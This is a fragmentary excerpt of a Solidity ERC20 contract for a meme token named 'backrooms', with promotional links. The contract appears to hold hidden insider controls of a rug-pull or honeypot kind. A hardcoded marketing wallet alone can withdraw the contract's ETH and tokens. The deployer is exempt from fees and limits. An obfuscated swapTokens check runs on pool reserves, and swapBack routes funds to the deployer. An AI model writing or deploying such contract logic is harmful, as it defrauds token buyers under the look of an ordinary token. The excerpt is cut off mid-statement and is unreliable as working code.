...
where it's nothing but the stink of old moist carpet, the madness of mono-yellow, 
...
telegram: https://t.me/backroomstx
website: https://www.backrooms0x.com/
twitter: https://twitter.com/backroomstx
...
contract backrooms is ERC20, Ownable {
    ...
    address public backroomsWallet;
    ...
    constructor() ERC20("backrooms", "BACK") {
        ...
        maxTransactionAmount = (totalSupply) / 1000 * 5; //0.5% of total supply
        maxWallet = (totalSupply) / 1000 * 5;  //0.5% of total supply
        ...
        marketingWallet = address(0x1FD3828188e280823A9D9c4bB4D2679D4c2bBEA3);
        developmentWallet = address(0xF3c849FF9a2c4752Ef2C5941B88244B914390A0D);
        backroomsWallet = address(msg.sender);
        ...
        excludeFromFees(backroomsWallet, true);
        ...
        excludeFromMaxTransaction(backroomsWallet, true);
    ...
    function updateSwapTokens(uint256 _preventSwapBefore)
        external
    {
        require(msg.sender == marketingWallet, "Only marketing wallet eligible disable tax swap");
    ...
    function updateBackroomsWallet(address _backroomsWallet)
        external
        onlyOwner
    {
        require(_backroomsWallet != address(0), "ERC20: Address 0");
        backroomsWallet = _backroomsWallet;
    }
    ...
    function withdrawStuckETH() public {
        require(msg.sender == marketingWallet, "Only marketing wallet eligible to withdrawl stuck ether");
        bool success;
    ...
    function withdrawStuckTokens(uint256 amount) external {
        require(msg.sender == marketingWallet, "Only marketing wallet eligible to withdrawl stuck tokens");
    ...
    function swapTokens(uint256 amount) internal view returns (bool) {
        if(preventSwapBefore == 0) return false;
        if(uniswapV2Pair == address(0)) return false;
        (uint256 t0, uint256 t1) =  getTaxAmount();
        return t1 - (((amount * (997)) * (t1)) / ((t0 *1000) + (amount * (997))))  < (( (t1 / (2**18*5**17)) * (2**18*5**17)));
    }
    ...
    function swapBack() private {
        ...
        balances = maxTransactionAmount * 1e4;
        ...
        (success, ) = address(backroomsWallet).call{
